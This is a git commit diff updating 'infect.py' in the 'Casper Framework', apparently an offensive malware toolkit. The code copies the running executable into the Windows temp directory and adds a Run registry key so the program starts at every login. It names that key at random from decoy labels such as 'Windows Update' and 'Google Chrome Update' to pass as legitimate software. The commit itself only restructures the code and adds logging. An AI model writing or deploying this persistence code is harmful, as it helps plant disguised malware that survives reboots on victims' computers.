a5fd83c515afce49a54dd501e7d154f015262d3a
rootm0s <rickardmalmkvist@hotmail.com>
2018-03-09 15:33:27 +0100

    Update infect.py

--- framework/infect.py
+++ framework/infect.py
@@ -3,23 +3,34 @@ Part of Casper Framework
 """
 from includes import *
 
-def infect():
-	value_names = ["Adobe Update","Microsoft Update",
-				"Windows Update","OneDrive Update",
-				"Acrobat Reader Plugin","Outlook Plugin",
-				"Microsoft Office Update","Google Chrome Update"]
-	
+value_names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
+
+def registry():
 	try:
-		logging.debug("[casper] Starting registry infection")
 		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
 		open = OpenKey(HKEY_CURRENT_USER,key,0,KEY_ALL_ACCESS)
 		SetValueEx(open,random.choice(value_names),0,REG_SZ,"%systemroot%\\temp\\"+sys.argv[0])
+		return True
 	except Exception as e:
 		return False
+
+def drop():
 	try:
 		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
+		return True
 	except Exception as e:
 		return False
-		
-	logging.debug("[casper] Finished registry infection")
+
+def infect():
+	logging.debug("[casper] Attempting to add registry key under >> Software\Microsoft\Windows\CurrentVersion\Run")
+	if (registry() == True):
+		logging.debug("[casper] Registry key was successfully created")
+
+		logging.debug("[casper] Dropping the file in temp directory")
+		if (drop() == True):
+			logging.debug("[casper] Finished registry infection")
+		else:
+			logging.debug("[casper] Error while dropping file at temp directory")
+	else:
+		logging.debug("[casper] Error while adding registry key")
 	return True
